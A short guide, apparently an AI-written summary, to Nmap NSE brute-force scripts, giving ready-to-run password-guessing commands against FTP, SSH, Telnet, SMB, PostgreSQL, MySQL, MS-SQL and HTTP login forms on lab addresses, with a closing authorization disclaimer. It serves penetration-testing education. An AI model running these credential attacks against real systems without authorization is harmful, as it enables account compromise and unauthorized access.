# 🔑 Nmap's NSE Scripts for Ethical Password Testing

&#x20;Nmap is a powerful network scanning and reconnaissance tool, and its NSE scripts can automate a wide range of tasks, including brute-force attacks to guess authentication credentials. Here's a summary of what you've shared:

Nmap's NSE scripts allow users to perform dictionary brute-force attacks on secured services. Some of the services covered include:

1.  **FTP Password Cracking** Using the `ftp-brute.nse` script to perform brute-force password auditing against FTP servers. Example:

    ```
    nmap -p21 --script ftp-brute.nse --script-args userdb=users.txt,passdb=pass.txt 192.168.1.150
    ```
2.  **SSH Password Cracking** Using the `ssh-brute.nse` script to perform brute-force password guessing against SSH servers. Example:

    ```
    nmap -p22 --script ssh-brute.nse --script-args userdb=users.txt,passdb=pass.txt 192.168.1.150
    ```
3.  **Telnet Password Cracking** Using the `telnet-brute.nse` script to perform brute-force password auditing against Telnet servers. Example:

    ```
    nmap -p23 --script telnet-brute.nse --script-args userdb=users.txt,passdb=pass.txt 192.168.1.150
    ```
4.  **SMB Password Cracking** Using the `smb-brute.nse` script to attempt to guess SMB username/password combinations. Example:

    ```
    nmap -p445 --script smb-brute.nse --script-args userdb=users.txt,passdb=pass.txt 192.168.1.150
    ```
5.  **Postgres Password Cracking** Using the `pgsql-brute` script to perform brute-force password auditing against PostgreSQL servers. Example:

    ```
    nmap -p5432 --script pgsql-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.150
    ```
6.  **MySQL Password Cracking** Using the `mysql-brute` script to perform brute-force password auditing against MySQL servers. Example:

    ```
    nmap -p3306 --script mysql-brute --script-args userdb=users.txt 192.168.1.150
    ```
7.  **HTTP-form Password Cracking** Using the `http-form-brute` script to perform brute-force password auditing against HTTP form-based authentication. Example:

    ```
    nmap -p80 --script=http-form-brute --script-args "userdb=users.txt,passdb=pass.txt,http-form-brute.path=/dvwa/login.php" 192.168.1.150
    ```
8.  **Ms-SQL Password Cracking** Using the `ms-sql-brute` script to perform brute-force password auditing against Microsoft SQL servers. Example:

    ```
    nmap -p1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.146
    ```

Please note that while Nmap's NSE scripts can be useful for security professionals and ethical hackers in testing the security of systems, it's essential to ensure that you have proper authorization and are abiding by relevant laws and regulations before performing any security testing or penetration testing activities. Unauthorized access or malicious use of these techniques can lead to legal consequences.
